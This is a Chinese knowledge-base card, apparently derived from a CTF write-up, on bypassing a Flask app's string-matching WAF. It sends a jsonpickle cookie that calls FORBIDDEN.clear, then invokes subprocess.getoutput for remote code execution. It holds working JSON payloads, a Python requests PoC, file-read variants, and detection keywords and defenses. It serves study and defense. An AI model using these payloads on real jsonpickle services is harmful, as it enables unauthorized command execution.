---
id: web-python-deserialization-jsonpickle-forbidden-list-clear-bypass
title: jsonpickle 反序列化绕 WAF：用 __main__.FORBIDDEN.clear 清空服务端黑名单再执行 subprocess
type: scenario
domain: web
path: web/python/deserialization
technique: jsonpickle-object-instantiation-forbidden-list-clear
tags:
- web
- python
- jsonpickle
- deserialization
- waf-bypass
- rce
- flask
- object-injection
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V244
  verified_at: '2026-11-07T13:16:58+08:00'
  notes: 已对照原文与30张图核对；jsonpickle safe=True、FORBIDDEN全局列表clear绕过、subprocess.getoutput回显与/app/app.py源码均一致；PoC未复跑
url: /docs/web/python/deserialization/web-python-deserialization-jsonpickle-forbidden-list-clear-bypass/
draft: false
kb_aliases:
- jsonpickle WAF 绕过
- FORBIDDEN.clear
- list.clear 清空黑名单
- Safe_bank
- py/object 任意函数调用
- jsonpickle safe=True 绕过
---

## 一句话结论

Flask 把 Base64 编码的 jsonpickle 会话 Cookie 直接 `jsonpickle.decode(decoded, safe=True)`，并在 decode 前用一份全局 `FORBIDDEN` 关键字列表做字符串黑名单。攻击者提交 `{"py/object":"__main__.Session","meta":{"user":{"py/object":"__main__.FORBIDDEN.clear","py/newargs":[]},...}}`，jsonpickle 在解码时会调用 `FORBIDDEN.clear()` 把服务端黑名单清空；此后再发送普通的 `subprocess.getoutput('/readflag')` 对象就不会被拦截，命令输出作为 `user` 字段回显到页面，完成 RCE。

## 原理

- **jsonpickle 的 `py/object`**：jsonpickle 允许在 JSON 中用 `py/object` 指定类/函数路径，用 `py/newargs` 传参；解码器会导入并调用该对象。攻击者因此可以把“数据还原”变成“任意可导入对象的构造/调用”。
- **黑名单是可变全局列表**：`FORBIDDEN` 是 Python 模块级 list，WAF 只做 `if bad in payload` 的字符串匹配。payload 里没有出现列表中的关键字（`subprocess`/`os`/`builtins`/`__dict__` 等），所以第一次请求能通过 WAF。
- **清空黑名单**：`__main__.FORBIDDEN.clear` 解析为 `FORBIDDEN` 这个 list 的 `clear` 方法（bound method），jsonpickle 调用它时不传参数（`py/newargs: []`），正好清空列表。之后同一进程内的 `waf()` 遍历空列表，任何 payload 都不再被拦截——这是**有状态**的 WAF 绕过。
- **为什么 `safe=True` 没挡住**：`safe=True` 主要限制反序列化到“安全类”，但 `FORBIDDEN.clear` 是模块内的可调用对象/方法引用，不在其拒绝范围；原文实测可以通过。具体版本行为可能有差异，但该题环境成立。
- **后续 RCE**：黑名单清空后，用 `{"py/object":"subprocess.getoutput","py/newargs":["/readflag"]}` 让 jsonpickle 调用 `subprocess.getoutput('/readflag')`，返回值被放进 `meta.user`，页面渲染 `user` 时回显；也可用 `linecache.getlines`/`glob.glob` 做文件读取与目录枚举。
- **前置信息**：普通注册登录后 Cookie 是 Base64(jsonpickle)，结构为 `{"py/object":"__main__.Session","meta":{"user":"...","ts":...}}`；把 `user` 改为 `admin` 可进入 `/panel`，但 `/vault` 的 flag 是假的，真正 flag 在 `/readflag`。

## 触发条件

- 应用把用户可控数据交给 `jsonpickle.decode`（即使 `safe=True`），且解码结果会影响权限判断（如 `meta.user == "admin"`）。
- WAF/黑名单在解码前只做字符串匹配，且黑名单是可变的模块级 list/字典等对象；进程长期运行（同一 worker 内状态可复用）。
- 攻击者能访问到 `/panel` 等会触发 decode 的接口；Cookie 可自由构造（Base64 编码）。
- 目标进程能导入 `subprocess`/`linecache` 等模块，且 `/readflag` 等命令/文件可执行/可读。
- 若多 worker/多进程，清空只影响当前 worker，需要多次请求/粘性会话；原文单进程 Flask 成立。

## 利用步骤

1. 注册并登录，抓 Cookie `authz`，Base64 解码确认 jsonpickle 结构。
2. 尝试把 `meta.user` 改成 `admin` 访问 `/panel`，确认解码路径；`/vault` 返回假 flag，判断真 flag 在 `/readflag`。
3. 发送清空黑名单 payload（`user` 字段为 `__main__.FORBIDDEN.clear`），确认页面不再返回“请不要黑客攻击”。
4. 发送执行 payload：`subprocess.getoutput('/readflag')`，读取回显；若 `subprocess` 被拦截，换 `linecache.getlines('/app/app.py')` 读源码、`glob.glob('/*')` 列目录。
5. 根据源码确认 WAF 黑名单与 flag 位置（可选），必要时用 `linecache.getlines` 读取 `/app/app.py`。
6. 直接请求带 payload 的 `/panel`，从响应中取 flag；若清空状态被新 worker 覆盖，重复第 3 步。

## PoC

```json
// 1) 清空 FORBIDDEN
{
  "py/object": "__main__.Session",
  "meta": {
    "user": {"py/object": "__main__.FORBIDDEN.clear", "py/newargs": []},
    "ts": 1753715060
  }
}
```

```json
// 2) 执行 /readflag
{
  "py/object": "__main__.Session",
  "meta": {
    "user": {"py/object": "subprocess.getoutput", "py/newargs": ["/readflag"]},
    "ts": 1753715060
  }
}
```

```python
import base64, json, requests
payload = {
  "py/object": "__main__.Session",
  "meta": {"user": {"py/object": "subprocess.getoutput", "py/newargs": ["/readflag"]}, "ts": 1753715060}
}
cookie = base64.b64encode(json.dumps(payload).encode()).decode()
r = requests.get("http://target/panel", cookies={"authz": cookie})
print(r.text)
```

原文先发清空 payload、再发执行 payload，得到 `NepCTF{be0cb2ec-db62-fd11-3cfa-985d117a0559}`；本卡未复跑。

## 变体与关联

- **文件读取**：`linecache.getlines('/app/app.py')`、`glob.glob('/*')` 可读取源码/列目录；原文用它们确认 `/flag` 为空、flag 在 `/readflag`。
- **其他清空方式**：若黑名单是 dict，可用 `__main__.FORBIDDEN.clear`；若是 set，可用 `clear`/`pop`；也可用 `__main__.FORBIDDEN.extend`/`__setitem__` 等修改内容。
- **多 worker**：清空只对当前进程生效；可通过多次请求命中同一 worker，或先读源码找更持久的绕过。
- **关联**：`[[web-python-deser-pyyaml-tag-directive-waf-bypass-linecache]]`（PyYAML `%TAG` 绕过 + linecache 读文件，同为“WAF 字符串匹配 vs 解析层语义不一致”）；`[[web-python-deserialization-pickle-pydoc-pipepager-short-blacklist-bypass]]`（pickle 短黑名单绕过）。
- **边界**：`jsonpickle.decode(safe=True)` 的类白名单在版本间有差异；若目标版本拒绝 `__main__` 对象或黑名单被重置，需另找可调用对象（如 `linecache.getlines` 直接读，不经清空）。

## 检测与防御

- **不要用 jsonpickle 处理不可信数据**：会话用 Flask 签名 Cookie（itsdangerous）、JWT 或服务端 session；必须用 jsonpickle 时用 `safe=True` 并显式类白名单，禁止 `py/object`/`py/newargs` 进入。
- **WAF 无状态化**：黑名单/规则表应为不可变/每次请求重建；不要把可被请求修改的全局对象作为安全边界；WAF 应做结构解析而非字符串匹配。
- **检测**：Cookie 中出现 `py/object`、`py/newargs`、`__main__`、`clear`、`subprocess`、`linecache`、`glob`；同一来源先发“清空”类 payload 再发命令/文件读取 payload；进程内 WAF 规则突然为空。
- **加固**：最小权限运行、`/readflag` 仅授权用户可执行、禁用不必要模块；对 decode 结果做类型/字段白名单（只允许 `meta.user` 为字符串）；监控异常子进程。
